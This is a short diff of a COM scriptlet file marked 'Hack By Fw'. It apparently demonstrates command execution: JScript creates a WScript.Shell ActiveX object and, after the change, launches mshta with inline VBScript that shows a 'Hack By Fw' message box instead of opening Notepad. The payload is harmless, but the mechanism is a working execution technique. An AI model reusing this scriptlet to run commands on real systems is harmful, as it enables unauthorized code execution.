@@ -4,8 +4,8 @@
 <!-- Hack By Fw -->
 <script language="JScript">
 	<![CDATA[    
-		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
-	]]>
+		var r = new ActiveXObject("WScript.Shell").Run("mshta vbscript:msgbox(\"Hack By Fw\",64,\"I am Hacker\")(window.close)")
+	]]>    
 </script>
 </registration>
 </scriptlet>
